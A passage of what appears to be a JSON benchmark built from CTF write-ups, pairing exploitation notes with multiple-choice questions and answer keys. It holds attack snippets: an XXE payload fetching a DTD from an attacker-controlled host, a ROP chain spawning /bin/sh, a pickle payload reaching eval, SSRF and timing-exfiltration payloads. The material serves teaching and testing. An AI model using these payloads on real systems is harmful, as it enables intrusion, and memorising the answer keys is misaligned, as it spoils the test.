            "For challenges involving server-side code evaluation, constructing the exploit payload may also require proper formatting and encapsulation of the payload in a manner expected by the server, such as JSON in a POST request. It highlights the importance of not only crafting a logical exploit but also delivering it in a format that the target server can parse and execute as intended.\n\n   Example payload in Python script:  \n   ```python\n   import requests, json\n\n   url = \"http://35.207.189.79/wee/run\"  \n   data_structure = \"\"\"{{ \"code\": {} }}\"\"\"  \n   data_content = \"\"\"alert(assert_equals(sqrt(-1)))\"\"\"\n   \n   data_content_to_send = json.dumps(data_content)  \n   data_to_send = data_structure.format(data_content_to_send)  \n   print(f\"[*] Payload: '{data_to_send}'.\")  \n   response = requests.post(url, data=data_to_send)  \n   print(f\"[*] Response: '{response.text}'.\")\n   ```"
        ],
        "question": [
            "In the context of exploiting server-side code evaluation, particularly with custom or less common programming languages, one noteworthy behavior is how they deal with special numerical cases. Given a scenario where you want to trigger a malfunction in an assertion function by proving two values are not equal when, by conventional logic, they should be. Which of the following operations could you use to generate a `NaN` value that would not be considered equal to itself, exploiting this behavior? - A. Calculating the cube root of 8 - B. Dividing zero by zero - C. Subtracting seven from thirteen - D. Taking the square root of a negative number",
            "In challenges that involve injecting exploitable code into a server-side interpreter through an HTTP request, the correct formatting and delivery of the payload are crucial for successful exploitation. Considering a Python script designed to submit such a payload, which piece of the script ensures that the payload is properly encapsulated and formatted to be accepted and executed by the server? - A. `data_content_to_send = json.dumps(data_content)` - B. `print(\"[*] Response: '{}'.\".format(response.text))` - C. `response = requests.post(url, data=data_to_send)` - D. `print(\"[*] Payload: '{}'.\".format(data_to_send))`"
        ],
        "answer": [
            "D.",
            "A."
        ]
    },
    {
        "name": "JuniorCTF - kim",
        "write_up": "dataset/raw/JuniorCTF - kim.md",
        "type": "This write-up belongs to a **web** challenge.",
        "competition": [
            "C3CTF/2017",
            "https://ctftime.org/event/544/tasks/"
        ],
        "score": 94,
        "max_score": 477,
        "difficulty": 0.1970649895178197,
        "knowledge": [
            "When faced with a scenario where a service generates a salted SHA1 hash of a query and you're given a known query-hash pair without the salt, consider a hash length extension attack. A hash length extension attack allows one to append data to the original query and generate a valid hash for the new query without knowing the salt. This technique is especially applicable if you can infer or brute-force the length of the salt. Tools like `hlextend` can be utilized for performing the attack effectively.",
            "The utility of a hash length extension attack increases when the application logic favors later occurrences of a parameter in a query. If an application uses the last occurrence of a parameter when the same parameter is specified multiple times, an attacker can append a manipulated parameter set that benefits from the application's handling to achieve unintended outcomes, such as accessing restricted files. \n\nExample usage with `hlextend`:\n```python\nimport hlextend\nsha = hlextend.new('sha1')\nnew_query = sha.extend('f=flag', 'f=sample.gif', 15, '952bb2a215b032abe27d24296be099dc3334755c', raw=True)\nnew_sha = sha.hexdigest()\n# This generates the new query and SHA1 hash, which then can be used to perform the intended action.\n```"
        ],
        "question": [
            "When attempting a hash length extension attack to append data to an original query with a known salted SHA1 hash, but without knowledge of the salt itself, which of the following is a critical element to obtain or infer for the attack to succeed? - A. The private key used to generate the hash - B. The length of the salt - C. The exact value of the salt - D. The encryption algorithm used to salt the hash ",
            "In an application that processes query parameters and utilizes the last occurrence of a parameter when it appears multiple times, why might a hash length extension attack be particularly effective? - A. It allows for the encryption of data without the need for the original hashing algorithm. - B. It enables the attacker to retrieve the plaintext version of the hashed data. - C. It permits the appending of a manipulated parameter set that takes advantage of the application\u2019s parameter handling logic. - D. It facilitates the direct modification of the application's source code to introduce vulnerabilities. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "JuniorCTF - localhost",
        "write_up": "dataset/raw/JuniorCTF - localhost.md",
        "type": "web",
        "competition": [
            "C3CTF/2018",
            "https://ctftime.org/event/718/tasks/"
        ],
        "score": 81,
        "max_score": 500,
        "difficulty": 0.162,
        "knowledge": [
            "When exploiting server configurations that use specific headers to identify or authenticate localhost requests, one can manipulate request headers or parameters to simulate requests coming from the localhost. This involves identifying server-side functionalities that interpret the incoming request's origin and manipulate these to treat the external request as originating from localhost. This can be achieved by using server functionalities meant for local requests, such as image proxying functionalities that do not adequately verify the origin of the request or blindly trust certain headers. Sample payload: `http://target.com/api/proxyimage?url=http://127.0.0.1:port/resource`",
            "Restrictions based on content types, such as only allowing image content types to be processed by certain functionalities, can be bypassed or exploited. If a functionality is designed to process only specific file types (e.g., images), but does not securely verify the actual content or the source of the file, attackers can leverage this functionality to perform unintended actions by carefully crafting the requests. This requires the attacker to provide a valid file of the allowed type that also serves the attacker's purpose, such as triggering server-side behaviors or leaking sensitive information."
        ],
        "question": [
            "In a scenario where a web application uses a proxy image functionality to avoid tainted canvases by serving images through its server, and the application sets a special token in the response headers for requests coming from localhost, how can an attacker exploit this functionality to make the server treat an external request as coming from localhost? - A. By sending a direct request to the proxy image functionality with the external server's URL. - B. By modifying the `User-Agent` header to mimic the server's internal browser agent. - C. By using the proxy image functionality with a URL parameter pointing to a resource on the server itself using the server's IP address. - D. By encrypting the request parameters to bypass server-side validation.",
            "When exploiting a web application that checks for content-type restrictions\u2014only allowing images to be processed by a certain functionality, which approach can an attacker take to manipulate the functionality for purposes other than intended, like triggering server-side behaviors or leaking sensitive information? - A. Submitting a request with a non-image file while changing the `Content-Type` header to `image/jpeg`. - B. Submitting an image file that includes malicious content, which gets executed upon processing by the server. - C. Submitting a multi-part request hiding non-image content within an image file's metadata. - D. Submitting a perfectly normal image file without any modifications or exploitation techniques."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "JuniorCTF - _dev_null",
        "write_up": "dataset/raw/JuniorCTF - _dev_null.md",
        "type": "misc",
        "competition": [
            "C3CTF/2018",
            "https://ctftime.org/event/718/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "A blind code injection vulnerability can be exploited using timing attacks if the server executes queries or scripts based on user input. When direct output is not available, differential analysis of response times for different inputs can be used to infer values. This technique is applicable in scenarios where the server's execution time can be influenced by input conditions.\nExample payload: if charAt(variable, position) == 'a' then pause(4500) end",
            "When dealing with code execution in a sandboxed or limited output environment, leveraging built-in language functions such as `pause` (to manipulate execution time) and string comparison functions like `charAt` (to check one character at a time) allows for exfiltrating data indirectly via side-channel attacks (timing attacks). This approach can be effective even when direct data extraction methods are not viable.\nExample payload loop structure: for each char in [charList]: if charAt(secret, currentPos) == char then pause(4500)"
        ],
        "question": [
            "In a scenario where direct output from server-side code execution is not available, which of the following payloads could be used to exploit a blind code injection vulnerability using a timing attack? - A. if charAt(variable, position) == 'b' then print('Found') end - B. variable == 'a' ? sleep(4500) : print('Not Found') - C. while variable[position] == 'a': time.sleep(4500) - D. if charAt(variable, position) == 'a' then pause(4500) end ",
            "Which of the following loop structures correctly represents a method to exfiltrate data from a server indirectly via side-channel (timing) attacks in a sandboxed environment, assuming built-in functions such as `pause` and `charAt` are available? - A. while not EOF(variable): if variable[currentPos] == char: wait(4500) - B. for each char in [charList]: if charAt(secret, currentPos) == char then pause(4500) - C. foreach (char in secret): if secret[currentPos] == char: delay(4500) - D. do { if (secret[currentPos] === char) sleep(4500) } while (chars) "
        ],
        "answer": [
            "D.",
            "B."
        ]
    },
    {
        "name": "Just another heap",
        "write_up": "dataset/raw/Just another heap.md",
        "type": "pwn",
        "competition": [
            "DCTF/2021",
            "https://ctftime.org/event/1361/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "In scenarios involving heap exploitation where the program allows for dynamic memory allocation and manipulates global pointers or GOT entries, setting an overly large length for `malloc` to force a null pointer and then precisely calculating an offset for a controlled write operation can effectively bypass security measures for arbitrary write conditions. By setting the length to `2**64 - 2**32 + target_address + desired_size`, malloc will fail and set the pointer to null (0x0), enabling a controlled _write-what-where_ condition by adjusting `target_address` for the _where_ and `desired_size` for the _what_. This technique can be used to modify GOT entries or other critical data structures for further exploitation.",
            "To leak libc addresses in heap exploitation challenges, manipulating global pointers to point to GOT entries can be an effective approach. First, create a heap chunk whose pointer is stored in a global array. Use a _write-what-where_ vulnerability to overwrite this global pointer to point to a Global Offset Table (GOT) entry or another known location in memory that contains a libc address. Subsequently, trigger functionality in the program that dereferences this pointer, causing the program to output the libc address. This approach allows for bypassing certain security mechanisms and facilitates libc address leakage, providing a path to system compromise."
        ],
        "question": [
            "In a heap exploitation scenario, if an application's malloc function is invoked with an extremely large size leading to failure and consequently setting the returned pointer to null, which arithmetic expression correctly calculates the amount to be passed to a subsequent operation that accepts an unsigned long integer, aiming to control the target's offset for a write operation? - A. 2^32 + target_address - desired_size - B. target_address / desired_size - C. 2**64 - 2**32 + target_address + desired_size - D. target_address * desired_size",
            "When leveraging a heap exploitation technique to leak libc addresses by overwriting a global pointer to a GOT entry, what action must be taken after manipulating the pointer to cause the program to output a libc address? - A. Invoke a system call directly using the overwritten pointer. - B. Trigger functionality that dereferences the modified global pointer, prompting the program to print or utilize the libc address inadvertently. - C. Manually calculate the libc base address using the overwritten pointer. - D. Execute arbitrary code to directly read the libc address from memory."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Just Go Around",
        "write_up": "dataset/raw/Just Go Around.md",
        "type": "web",
        "competition": [
            "Square/2023",
            "https://ctftime.org/event/2111/tasks/"
        ],
        "score": 250,
        "max_score": 500,
        "difficulty": 0.5,
        "knowledge": [
            "When encountering a web application that involves a modern NoSQL DB and features such as fuzzy text search, it is important to consider the concept of \"soft deletes\" in attempting to retrieve supposedly deleted content. Soft deletes are a method where data isn't actually removed from the database but is instead flagged as deleted or made inaccessible to standard user queries. This knowledge could be crucial in challenges where accessing deleted content could lead to discovering hidden or secret information.",
            "In web applications where user input is serialized into XML before being processed, there is a potential vulnerability for an XXE (XML External Entity) attack. An XXE attack can be exploited to perform actions unintended by the application's design, such as accessing local files (LFI), SSRF (Server Side Request Forgery), or even executing remote code under certain conditions. To exploit this vulnerability, one can craft a malicious XML document that includes directives to load data from external sources or internal files that the attacker shouldn't have access to. This attack vector can be particularly useful in scenarios where the goal is to access configuration files, sensitive data, or interact with internal systems (like a database) that are not directly accessible from the web application's front end.\n   - Example payload for XXE to perform SSRF: ```<?xml version=\"1.0\" ?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://attacker-controlled-site.com/malicious.dtd\">%remote;%int;%trick;]>```"
        ],
        "question": [
            "In a web challenge featuring a modern NoSQL database with fuzzy search capabilities, if you needed to retrieve a post that was supposedly deleted but might still be present in the database, which technique would you consider essential to explore? - A. Using brute-force attacks to guess the post's unique ID. - B. Exploiting SQL injection vulnerabilities to access the database directly. - C. Considering the use of cryptographic attacks to decrypt database information. - D. Employing the concept of \"soft deletes\" to search for data flagged as deleted but still existing in the database.",
            "When you encounter a web application where user input is serialized into XML for processing and you aim to retrieve sensitive data or interact with internal systems, which attack technique should you primarily consider exploiting? - A. Cross-Site Scripting (XSS) to steal session cookies and impersonate users. - B. SQL Injection to manipulate database queries and access unauthorized data. - C. XML External Entity (XXE) attack to perform actions such as SSRF or accessing local files. - D. Cross-Site Request Forgery (CSRF) to execute actions on behalf of authenticated users without their consent."
        ],
        "answer": [
            "D.",
            "C."
        ]
    },
    {
        "name": "Just pwn it",
        "write_up": "dataset/raw/Just pwn it.md",
        "type": "pwn",
        "competition": [
            "ASIS/2021/Quals",
            "https://ctftime.org/event/1415/tasks/"
        ],
        "score": 51,
        "max_score": 500,
        "difficulty": 0.102,
        "knowledge": [
            "When exploiting a binary with a stack overflow vulnerability, it is crucial to understand the binary's security mechanisms to develop an effective exploit. The presence of security mitigations like No eXecute (NX), Position Independent Executable (PIE), and stack canaries, along with the binary's architecture (32-bit or 64-bit), greatly influence the exploit development process. For instance, in binaries compiled without PIE (No PIE), and with NX enabled but no stack canaries, an attacker can execute a Return-Oriented Programming (ROP) attack by overwriting the return address with a carefully crafted sequence of gadget addresses found within the binary. This method can be used to bypass the NX protection by redirecting the program's execution flow to the desired gadgets to execute arbitrary code.",
            "In scenarios where direct code execution is not possible due to NX protections, pivoting the stack to a controlled area of memory where the ROP payload is stored enables the execution of a ROP chain. This can be achieved by exploiting vulnerabilities that allow controlling the stack pointer (e.g., through an arbitrary write vulnerability or, as demonstrated, by manipulating function saved base pointers). Once the stack is pivoted, a ROP chain can be executed to perform arbitrary operations, such as spawning a shell. The ROP chain is crafted using a sequence of gadgets to execute system calls directly, bypassing the need for function calls to system libraries, which is particularly useful in statically linked binaries where external library calls are not an option.\n\nExample ROP chain:  \n```python\nPOP_RDI = 0x0000000000401b0d  \nPOP_RSI = 0x00000000004019a3  \nPOP_RDX = 0x0000000000403d23  \nPOP_RAX = 0x0000000000401001  \nSYSCALL = 0x00000000004013e9  \nMOV_RSI_PTR_RAX = 0x0000000000406c32  \nPT_LOAD_W = writable_segment_address  # Example address to write \"/bin/sh\"\n\npayload = [\n    POP_RSI, b\"/bin/sh\\x00\",  # Set RSI to point to \"/bin/sh\\x00\"\n    POP_RAX, PT_LOAD_W,       # Load the address of a writable segment into RAX\n    MOV_RSI_PTR_RAX,          # Move the string \"/bin/sh\\x00\" into the writable segment\n    POP_RAX, 0x3b,            # Load sys_execve syscall number into RAX\n    POP_RDI, PT_LOAD_W,       # Load the address of \"/bin/sh\" into RDI\n    POP_RSI, 0x0,             # Clear RSI\n    POP_RDX, 0x0,             # Clear RDX\n    SYSCALL                   # Invoke the syscall to execute \"/bin/sh\"\n]\n```"
        ],
        "question": [
            "Given a statically linked binary without PIE and with NX enabled, if a stack overflow vulnerability exists without stack canaries, what type of exploit technique is most suitable for executing arbitrary code? - A. Heap Spraying - B. Return-Oriented Programming (ROP) - C. Format String Attack - D. Use After Free (UAF)",
            "In a scenario where the NX bit is enabled, preventing the execution of code on the stack, and direct code injection is not possible, which technique allows an attacker to execute a predefined sequence of operations, such as spawning a shell, by manipulating the program's control flow? - A. Creating a stack pivot to execute a Return-To-Libc (Ret2libc) attack - B. Overwriting the Global Offset Table (GOT) to redirect library calls - C. Crafting and executing a ROP chain by pivoting the stack to a controlled area containing the payload - D. Exploiting an integer overflow to bypass memory protections"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Just Take Your Time",
        "write_up": "dataset/raw/Just Take Your Time.md",
        "type": "crypto",
        "competition": [
            "DCTF/2021",
            "https://ctftime.org/event/1361/tasks/"
        ],
        "score": 200,
        "max_score": 500,
        "difficulty": 0.4,
        "knowledge": [
            "In challenges involving encryption with time-based keys, if the encryption algorithm uses the current time (timestamp) as part of the key, attempting to decrypt the ciphertext can be achieved by closely synchronizing the decryption attempt with the time the ciphertext was generated. This is especially relevant if the algorithm pads the key with predictable data (such as zeroes) to meet key length requirements. The synchronization can be achieved by generating the decryption key with the current time, assuming the challenge or application generating the ciphertext provides enough information to approximate the time of encryption within a small window (like within seconds of the encryption occurring).",
            "When dealing with DES (Data Encryption Standard) or Triple DES encryption, it's important to understand the role of parity bits in keys. DES keys include parity bits, and sometimes, even if a key is slightly off (such as by one bit), decryption can still succeed. This property could be exploited in CTF challenges or practical scenarios where you can predict or closely approximate the key. Being aware of this can lead to successful decryption even when the key used isn't an exact match but is close enough, particularly when the key generation process is based on predictable or accessible data (like a timestamp)."
        ],
        "question": [
            "In a scenario where an encryption algorithm generates keys based on the current timestamp padded with zeroes to meet the key length requirement for Triple DES, which of the following best describes a method to decrypt the ciphertext within a limited time window? - A. Increase the encryption key length by adding random bytes at the end. - B. Generate the decryption key by using a high-precision timestamp and applying different padding techniques. - C. Synchronize the generation of the decryption key to be within a brief time interval of when the ciphertext was produced, utilizing the current time as the basis for the key. - D. Convert the ciphertext into base64 encoding before attempting decryption to compensate for timing differences.",
            "When decrypting data encrypted with Triple DES, where parity bits are considered in the keys, what is a crucial factor to consider for successful decryption if the available decryption key is slightly incorrect, such as being off by one bit? - A. Decrypting the ciphertext multiple times with incrementally increased key lengths until successful. - B. Applying a hash function to the key before attempting decryption to ensure its integrity. - C. Understanding that the presence of parity bits in DES keys might allow successful decryption, even with a key that is approximately correct by closely matching the original encryption key. - D. Converting the ciphertext into a different encryption scheme before attempting decryption, to negate the effect of parity bit errors."
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "Kaffee oder Bier_!",
        "write_up": "dataset/raw/Kaffee oder Bier_!.md",
        "type": "crypto",
        "competition": [
            "ASIS/2020/Quals",
            "https://ctftime.org/event/964/tasks/"
        ],
        "score": -1.0,
        "max_score": 375,
        "difficulty": -1,
        "knowledge": [
            "In scenarios involving custom encryption algorithms where encryption is performed character by character and results in identical output for identical input characters, an effective approach is to create a substitution table by encrypting every possible character in the character set. This method leverages the fact that the encryption behaves similarly to ECB mode, making it predictable and allowing for the recovery of encrypted messages through matching. This approach is particularly useful when dealing with algorithms that are computationally intensive or poorly optimized, as it avoids the need to reverse-engineer or reimplement the encryption logic.\n\n    ```python\n    def worker(c):\n       input_file = str(ord(c)) + \".txt\"\n       output_file = str(ord(c)) + \".enc\"\n       with codecs.open(input_file,'wb') as f:\n           f.write(c)\n       os.system(\"./COB \" + input_file + \" \" + output_file)\n    ```",
            "After generating encrypted representations for each character in the charset using the method described in point 1, one can proceed to decrypt an encrypted message by constructing a mapping from the encrypted characters to their plaintext equivalents. By splitting the encrypted message at predetermined separators (e.g., \"0000\" used in this challenge to separate encrypted character representations) and leveraging the previously generated mapping, the original message can be reconstructed. This method assumes the availability of or ability to generate a comprehensive mapping between plaintext characters and their encrypted counterparts.\n\n    ```python\n    for c in enc.split(\"0000\"):\n        if str(int(c)) in mapping:\n            res += mapping[str(int(c))]\n        else:\n            res += '?'\n    print(res)\n    ```"
        ],
        "question": [
            "In the context of analyzing a custom encryption algorithm where each character's encryption result is unique and consistent for identical inputs, what Python code fragment illustrates the correct approach for generating a mapping for each character in the charset?  - A. ```python def worker(c): encrypted_value = hashlib.md5(c).digest() return chr(encrypted_value) ``` - B. ```python def worker(c): return c.encode('hex') ``` - C. ```python def encode(c): return base64.b64encode(c) ``` - D. ```python def worker(c): input_file = str(ord(c)) + \".txt\" output_file = str(ord(c)) + \".enc\" with codecs.open(input_file,'wb') as f: f.write(c) os.system(\"./COB \" + input_file + \" \" + output_file) ```",
            "After developing encrypted representations for all potential characters in the charset using a substitution table, which Python code shows the correct method to decrypt an encrypted message by iterating over encoded character blocks and mapping them back to their plaintext equivalents?  - A. ```python for c in enc.split(\" \"): res += decode(c) print(res) ``` - B. ```python def decryptor(c): decrypted_file = c + \".dec\" os.system(\"./Decryptor \" + c + \" \" + decrypted_file) ``` - C. ```python for c in enc.split(\"0000\"): if str(int(c)) in mapping: res += mapping[str(int(c))] else: res += '?' print(res) ``` - D. ```python for c in enc: res += mapping.get(c, '?') print(\"\".join(res)) ```"
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Karen",
        "write_up": "dataset/raw/Karen.md",
        "type": "crypto",
        "competition": [
            "zer0pts/2022",
            "https://ctftime.org/event/1555/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "For cryptographic challenges involving the Hidden Subset Sum Problem, where the challenge setup resembles the knapsack cipher, and one only knows the encrypted message but not the public key, the reference to the state-of-art algorithm and implementation from the paper titled \"A Polynomial-Time Algorithm for Solving the Hidden Subset Sum\" can be employed. This paper, accepted at CRYPTO20, includes applicable code snippets in SageMath, demonstrating a practical approach to tackle such challenges.",
            "In scenarios where the challenge parameters, such as `n` and `m` in a matrix context, are specifically provided and fit within the feasible solution space of a known algorithm (like the Nguyen-Stern algorithm for the Hidden Subset Sum Problem), conducting experiments with these algorithms can lead to the successful decryption of the flag. This approach requires running the algorithm against the output given by the challenge, adjusting it as necessary to fit the challenge constraints.\n\nExample application of related knowledge (Extracted from scenario and cannot directly apply to all cases):\n- Identify algorithm suitability based on challenge parameters (`n`, `m`, bit length of variables).\n- Apply and adjust provided code from reputable cryptographic papers or sources to solve the challenge."
        ],
        "question": [
            "In the context of cryptographic challenges involving matrices and the Hidden Subset Sum Problem, which of the following algorithms is recommended when you only have access to the encrypted message and lack the public key, based on a state-of-the-art approach documented in a CRYPTO20 paper? - A. RSA encryption algorithm - B. Diffie-Hellman key exchange - C. A Polynomial-Time Algorithm for Solving the Hidden Subset Sum - D. AES encryption algorithm",
            "Given a cryptographic challenge that provides specific parameters (such as `n = 70` and `m = 351`) in a matrix encryption scenario resembling the knapsack cipher, which of the following algorithms would be most appropriate to experiment with for decrypting a provided output, according to documented success in similar constraints? - A. Nguyen-Stern algorithm - B. Shor's algorithm for quantum computing - C. Elliptic Curve Cryptography - D. Merkle-Hellman knapsack algorithm"
        ],
        "answer": [
            "C",
            "A"
        ]
    },
    {
        "name": "Karte",
        "write_up": "dataset/raw/Karte.md",
        "type": "pwn",
        "competition": [
            "TSG/2020",
            "https://ctftime.org/event/1004/tasks/"
        ],
        "score": 341,
        "max_score": 428,
        "difficulty": 0.7967289719626168,
        "knowledge": [
            "In challenges involving heap exploitation under glibc versions 2.28 and above, using Uninitialized After Free (UAF) vulnerabilities to overwrite the `bk` pointer of a smallbin chunk can bypass the tcache double-free protection. This technique can allow for arbitrary address manipulation by directing `malloc` to return a pointer to a controlled location. Here, the condition is having a UAF bug that does not get caught by the tcache mechanism, which was strengthened in glibc-2.28 to prevent simple double-free vulnerabilities.",
            "Exploiting heap vulnerabilities to modify application behavior can involve manipulating internal data structures such as the `tcache` and `smallbins`. By carefully crafting fake chunks and using the `tcache_stashing` technique, an attacker can cause `malloc` to stash other chunks into the `tcache`, leading to controlled writes. This approach manifests through overwriting function pointers or authorization flags to escalate privileges within the application. The condition for this knowledge is the presence of a heap-based vulnerability that allows for arbitrary write operations, particularly in environments where the heap layout and behavior are well-understood by the attacker."
        ],
        "question": [
            "In a scenario where a heap exploitation challenge is designed under glibc version 2.31, and the attacker has discovered a UAF vulnerability that allows writing to the `id` member of a freed chunk, which of the following techniques is applicable for overwriting the `bk` pointer of a smallbin chunk to manipulate `malloc`'s behavior? - A. Utilizing the UAF to directly overwrite `tcache` entries without any additional manipulation. - B. Employing the UAF to overwrite the `bk` pointer of a smallbin chunk, bypassing the tcache double-free protection to manipulate arbitrary addresses. - C. Leveraging the UAF to cause a segmentation fault by corrupting the `bk` pointer of a smallbin chunk. - D. Applying the UAF to overwrite the `fd` pointer in a fastbin chunk, bypassing the need to manipulate smallbin chunks.",
            "Given an environment with a heap-based vulnerability in a challenge, which involves glibc-2.31, where the attacker can leverage Uninitialized After Free (UAF) to manipulate heap chunks, which technique is crucial for redirecting `malloc` to return a pointer to a controlled location, thereby achieving unauthorized access or privilege escalation? - A. Incrementing the `tcache` count to bypass the `malloc` request and directly interact with the system memory. - B. Modifying the global offset table (GOT) entries to redirect function calls to arbitrary locations without interacting with the heap. - C. Creating numerous fastbin chunks to exhaust the `tcache` and force `malloc` to return a pointer to the attacker-controlled chunk. - D. Using `tcache_stashing` to overwrite specific pointers like `bk` in smallbins by stashing them into the `tcache`, leading to controlled writes."
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Katherine",
        "write_up": "dataset/raw/Katherine.md",
        "type": "crypto",
        "competition": [
            "BalCCon/2020",
            "https://ctftime.org/event/1100/tasks/"
        ],
        "score": 486,
        "max_score": 497,
        "difficulty": 0.9778672032193159,
        "knowledge": [
            "When attempting to compromise a system utilizing Elliptic Curve Diffie-Hellman (ECDH) for authentication, and direct access to the target's private key is impossible, consider employing a Key Compromise Impersonation (KCI) attack if you can obtain the private key of a party that the target trusts. This approach allows for impersonation by deriving shared keys without needing the actual private key of the impersonated entity. KCI attacks exploit the trust relationship and rely on possessing the private key of a trusted party by the target, enabling attackers to bypass authentication checks.",
            "In scenarios where secret keys are derived from easily guessable or weak secrets, such as PINs, a brute-force attack can be surprisingly effective. This method relies on the knowledge that many systems use insufficiently secure methods to protect and generate private keys. By trying all possible combinations of the weak secret (with knowledge of its format, such as being a numeric PIN of a certain length), an attacker can derive the corresponding private key. Once obtained, this key can facilitate further attacks, such as impersonating a user or decrypting communications. This technique underscores the importance of using strong, unpredictable methods for key derivation. \n\n   Example brute-force approach for PIN-derived keys:\n   ```python\n   for pin in product('0123456789', repeat=r):  \n       pin = ''.join(pin)  \n       if encode_publickey(get_server_privatekey(pin)) == server_puk_enc:  \n           print('Cracked! pin:', pin)  # Example pin that was cracked: 7741\n   ```"
        ],
        "question": [
            "In the context of a Key Compromise Impersonation (KCI) attack within an Elliptic Curve Diffie-Hellman (ECDH) authentication environment, what is the crucial piece of information an attacker must acquire to impersonate any entity successfully? - A. The server's public key. - B. The victim's public key. - C. The trusted party's private key. - D. The ECDH shared secret.",
            "When attempting to crack an encrypted server key secured by a PIN-derived method, which of the following approaches best represents a brute-force attack to uncover the PIN and thereby derive the corresponding private key? - A. Sequentially trying each PIN from a predefined list of most common PINs. - B. Using a complex algorithm to invert the public key back to a possible PIN. - C. Iterating through possible PIN combinations and checking if the derived public key matches the known encrypted server key. - D. Attempting a single guessed PIN based on personal information about the key holder."
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "kernel-rop",
        "write_up": "dataset/raw/kernel-rop.md",
        "type": "reverse",
        "competition": [
            "HXP/2020",
            "https://ctftime.org/event/1134/tasks/"
        ],
        "score": 667,
        "max_score": 1000,
        "difficulty": 0.667,
        "knowledge": [
            "When facing kernel-level vulnerabilities, especially with protections like FG-KASLR (Fine-Grained Kernel Address Space Layout Randomization), identifying static areas or symbols within the kernel memory that do not change across reboots can be crucial. These non-randomized points can be leveraged as reliable gadgets for constructing a ROP (Return Oriented Programming) chain or for information leaks. It's effective to examine symbols at the start of the kernel image and certain kernel structures such as `ksymtab` which contains real symbol offsets and could be utilized for developing an exploit.",
            "In scenarios involving kernel exploitation, it's possible to modify kernel memory directly to alter execution flow or manipulate kernel functionalities. An example is overwriting specific kernel strings, such as `/sbin/modprobe`, to point to a malicious script or binary. This can trigger arbitrary code execution within the kernel context when the modified kernel path is accessed. This technique requires finding and using non-randomized gadgets within the kernel to perform the necessary memory modifications. Example payload or technique: If a gadget allows writing arbitrary values to a specified address (`write-what-where`), it could be used to overwrite the memory address of `/sbin/modprobe` string in kernel memory to point to a controlled path like `/tmp/malicious_script`."
        ],
        "question": [
            "In exploiting FG-KASLR-protected kernels, why is it significant to locate static symbols or areas within the kernel memory? - A. They can be used to disable FG-KASLR protection directly. - B. They are necessary for the kernel to perform its routine operations without failure. - C. Static symbols or areas serve as reliable gadgets for constructing a ROP chain or for information leaks. - D. They indicate vulnerabilities within the kernel source code that can be exploited without ROP techniques.",
            "How can kernel memory modification be leveraged during a kernel exploitation? - A. By deleting specific kernel strings to crash the system. - B. By overwriting kernel strings, such as `/sbin/modprobe`, to point to a malicious script, thus triggering arbitrary code execution. - C. Modifying kernel memory is solely used for information leaks, not for altering execution flow. - D. By using non-randomized gadgets to increase kernel memory space for payload injection."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Kevin Higgs",
        "write_up": "dataset/raw/Kevin Higgs.md",
        "type": "The type of this CTF challenge is **crypto**.",
        "competition": [
            "angstrom/2022",
            "https://ctftime.org/event/1588/tasks/"
        ],
        "score": 210,
        "max_score": 250,
        "difficulty": 0.84,
        "knowledge": [
            "In a challenge involving Python pickle deserialization vulnerabilities, if restrictions on the accessible modules and functions are applied, leverage built-in functionalities and indirect access methods. Specifically, use the pickle protocol to execute custom code by building a serialized object that utilizes allowed methods (`__setattr__`, `__getattribute__`, etc.) to dynamically access and invoke Python internal functionalities (e.g., accessing `__builtins__` for `eval` execution). This technique bypasses restrictions on direct access to dangerous functions or modules.",
            "When you are limited by constraints related to the depth of attribute access (e.g., not being able to use more than one dot in method arguments), employ intermediate steps to build the payload. This involves manipulating an accepted \"empty\" module or any other allowed entities by sequentially setting attributes to reach deeper functionalities. This incremental setup allows for the assembly of a complex execution chain, ultimately leading to arbitrary code execution or reading sensitive files (like \"/flag.txt\"). \n\nExample Payload:\n```\n\\x80\\x04' \\  \n'Vempty\\nV__class__.__base__\\n\\x93p0\\n' \\  \n'(Vempty\\nV__setattr__\\n\\x93p1\\n' \\  \n'g1\\n(Vobj\\ng0\\ntR' \\  \n'Vempty\\nVobj.__getattribute__\\n\\x93p2\\n' \\  \n'g1\\n(Vsc\\nVempty\\nVobj.__subclasses__\\n\\x93)RtR' \\  \n'Vempty\\nVsc.__getitem__\\n\\x93p3\\n' \\  \n'g1\\n(Vi\\ng2\\n(g3\\n(I100\\ntRV__init__\\ntRtR' \\  \n'g1\\n(Vgl\\nVempty\\nVi.__globals__\\n\\x93tR' \\  \n'Vempty\\nVgl.__getitem__\\n\\x93p4\\n' \\  \n'g1\\n(Vb\\ng4\\n(V__builtins__\\ntRtR' \\  \n'Vempty\\nVb.__getitem__\\n\\x93p5\\n' \\  \n'g1\\n(Ve\\ng5\\n(Veval\\ntRtR' \\  \n'Vempty\\nVe\\n\\x93(Vprint(open(\"/flag.txt\").read())\\ntR.'\n```"
        ],
        "question": [
            "In the context of Python pickle deserialization, when facing restrictions on directly accessing high-risk modules and functions, which of the following is a viable method to execute arbitrary code by indirectly accessing Python's built-in functionalities? - A. Use the `pickle.dumps` method to directly serialize unsafe code. - B. Modify the Python runtime to remove the restriction checks. - C. Build a serialized object using allowed methods like `__setattr__` and `__getattribute__` to dynamically set and access attributes, eventually leading to the invocation of Python internal functionalities such as `eval`. - D. Increase the maximum recursion depth of Python to bypass restriction checks.",
